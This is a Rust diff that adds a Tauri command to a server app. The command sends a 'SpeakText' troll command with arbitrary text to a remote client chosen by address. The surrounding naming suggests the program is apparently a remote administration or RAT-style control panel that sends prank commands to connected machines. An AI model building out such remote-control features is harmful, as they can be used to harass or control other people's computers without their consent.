@@ -972,3 +972,29 @@ pub async fn send_troll_command(
 
     Ok("Troll command sent".to_string())
 }
+
+#[tauri::command]
+pub async fn send_troll_command_with_text(
+    addr: &str,
+    command: String,
+    text: String,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle,
+) -> Result<String, String> {    
+    // Only support SpeakText command with text parameter for now
+    if command != "SpeakText" {
+        return Err("Invalid command with text parameter".to_string());
+    }
+    
+    // Create the SpeakText command with the text parameter
+    let troll_command = TrollCommand::SpeakText(text);
+    
+    // Send the command to the client
+    send_server_command(
+        ServerCommand::HandleTroll(addr.parse().unwrap(), troll_command), 
+        tauri_state, 
+        app_handle
+    ).await?;
+
+    Ok("Text-to-speech command sent".to_string())
+}
